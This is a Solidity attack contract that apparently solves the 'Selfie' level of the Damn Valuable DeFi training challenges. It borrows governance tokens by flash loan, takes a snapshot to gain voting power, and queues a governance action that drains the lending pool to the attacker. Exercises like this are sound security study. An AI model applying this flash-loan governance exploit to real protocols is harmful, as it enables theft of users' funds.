// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
  SelfiePool immutable pool;
  SimpleGovernance immutable governance;
  DamnValuableTokenSnapshot immutable tokenSnapshot;
  address immutable attackerAddr;
  uint256 actionId;

  constructor (address selfiePoolAddr, address tokenSnapshotAddr, address governanceAddr) {
    pool = SelfiePool(selfiePoolAddr);
    tokenSnapshot = DamnValuableTokenSnapshot(tokenSnapshotAddr);
    governance = SimpleGovernance(governanceAddr);
    attackerAddr = msg.sender;
  }
  
  function receiveTokens(address, uint256 amount) external {
    // Since we can simply trigger a snapshot on our own, we do that when getting the loan
    // and then queue the action to be executed later on
    tokenSnapshot.snapshot();
    actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", attackerAddr), 0);
    
    tokenSnapshot.transfer(address(pool), amount);
  }
  
  function queue() external {
    pool.flashLoan(tokenSnapshot.balanceOf(address(pool)));
  }
  
  function execute() external {
    governance.executeAction(actionId);
  }
}
